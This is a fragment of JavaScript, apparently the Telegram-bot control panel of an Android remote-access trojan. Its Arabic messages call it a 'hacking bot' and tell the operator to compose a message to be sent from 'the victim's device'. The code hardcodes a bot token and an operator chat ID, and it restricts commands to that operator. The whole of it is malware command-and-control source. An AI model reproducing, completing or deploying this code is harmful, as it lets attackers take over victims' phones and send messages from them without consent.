...
const token = '8590562004:AAF9DNb7X9J4s05EHnY_VXn-kmFKkeY2epM'
const id = '1002670694'
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورأّمَبِرأّطّوِر شٍرعٌبِ   ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '967736223320') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوتأّمَبِرأّطّوِر شٍرعٌبِ  \n\n' +
